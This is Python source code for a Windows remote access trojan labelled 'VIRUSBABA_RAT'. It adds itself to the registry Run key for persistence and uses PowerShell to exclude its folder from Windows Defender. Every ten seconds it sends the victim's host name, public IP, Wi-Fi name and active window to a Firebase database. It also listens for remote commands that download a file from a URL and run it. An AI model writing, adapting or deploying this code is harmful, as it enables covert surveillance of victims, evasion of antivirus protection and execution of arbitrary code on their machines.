import sys
import os
import json
import time
import socket
import subprocess
import threading
import requests
import psutil
import win32gui
import firebase_admin
from firebase_admin import credentials, firestore, storage

# ============================================
# AUTO-STARTUP (Registry)
# ============================================
def add_to_startup():
    try:
        import winreg
        exe_path = sys.executable
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "VIRUSBABA_RAT", 0, winreg.REG_SZ, exe_path)
        return True
    except:
        return False
add_to_startup()

# ============================================
# DEFENDER EXCLUSION (Whitelist)
# ============================================
def add_defender_exclusion():
    try:
        exe_dir = os.path.dirname(sys.executable)
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{exe_dir}\'"'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
    except:
        pass
add_defender_exclusion()

# ============================================
# SYSTEM INFO
# ============================================
def get_pc_name():
    return socket.gethostname()

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return "Unknown"

def get_wifi_ssid():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=3)
        for line in result.stdout.split('\n'):
            if "SSID" in line and "BSSID" not in line:
                return line.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_resources():
    return {
        "cpu": psutil.cpu_percent(interval=0.5),
        "ram": psutil.virtual_memory().percent,
        "disk": psutil.disk_usage("C:").percent,
        "battery": psutil.sensors_battery().percent if psutil.sensors_battery() else -1
    }

def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        pid = win32gui.GetWindowThreadProcessId(hwnd)[1]
        process = psutil.Process(pid).name()
        return title, process
    except:
        return "Unknown", "Unknown"

# ============================================
# EXTRACT CONFIG (Embedded in EXE)
# ============================================
def extract_config():
    try:
        with open(sys.executable, 'rb') as f:
            f.seek(-10000, 2)
            raw = f.read()
            marker = b'--PAYLOAD-CONFIG--'
            if marker in raw:
                start = raw.find(marker) + len(marker)
                config_part = raw[start:]
                config_str = config_part.split(b'\x00')[0].decode('utf-8')
                return json.loads(config_str)
    except:
        return None
    return None

# ============================================
# MAIN AGENT
# ============================================
def main():
    config = extract_config()
    if not config:
        return

    victim_id = config['child_id']
    cred_dict = json.loads(config['firebase_creds'])

    # Initialize Firebase
    cred = credentials.Certificate(cred_dict)
    firebase_admin.initialize_app(cred, {
        'storageBucket': cred_dict.get('project_id') + '.appspot.com'
    })
    db = firestore.client()
    bucket = storage.bucket()

    pc_name = get_pc_name()
    public_ip = get_public_ip()
    wifi_ssid = get_wifi_ssid()

    # ============================================
    # TELEMETRY LOOP (Every 10 seconds)
    # ============================================
    def send_telemetry():
        try:
            window_title, process_name = get_active_window()
            resources = get_resources()
            db.collection("telemetry").add({
                "child_id": victim_id,
                "pc_name": pc_name,
                "public_ip": public_ip,
                "wifi_ssid": wifi_ssid,
                "window": window_title,
                "process": process_name,
                "cpu": resources["cpu"],
                "ram": resources["ram"],
                "disk": resources["disk"],
                "battery": resources["battery"],
                "timestamp": firestore.SERVER_TIMESTAMP
            })
        except:
            pass

    # ============================================
    # COMMAND LISTENER (Only open_file)
    # ============================================
    def listen_commands():
        def on_snapshot(doc_snapshot, changes, read_time):
            for doc in doc_snapshot:
                data = doc.to_dict()
                if data.get('status') != 'pending':
                    continue

                cmd_type = data.get('type')

                # --- FILE OPEN (Send File) ---
                if cmd_type == 'open_file':
                    try:
                        file_url = data['file_url']
                        file_name = data['file_name']
                        download_path = os.path.expanduser(f"~\\Downloads\\{file_name}")

                        # Download the file
                        r = requests.get(file_url, timeout=60)
                        with open(download_path, 'wb') as f:
                            f.write(r.content)

                        # Open it with default program (like double-click)
                        os.startfile(download_path)

                        # Mark as completed
                        doc.reference.update({"status": "completed"})
                    except Exception as e:
                        # If anything fails, log the error and mark as error
                        doc.reference.update({"status": "error", "error": str(e)})

        # Start listening for commands for this victim
        db.collection("commands").where("child_id", "==", victim_id).on_snapshot(on_snapshot)

    # ============================================
    # START THREADS
    # ============================================
    threading.Thread(target=listen_commands, daemon=True).start()

    # ============================================
    # MAIN LOOP (Send telemetry every 10s)
    # ============================================
    while True:
        try:
            send_telemetry()
        except:
            pass
        time.sleep(10)

if __name__ == "__main__":
    main()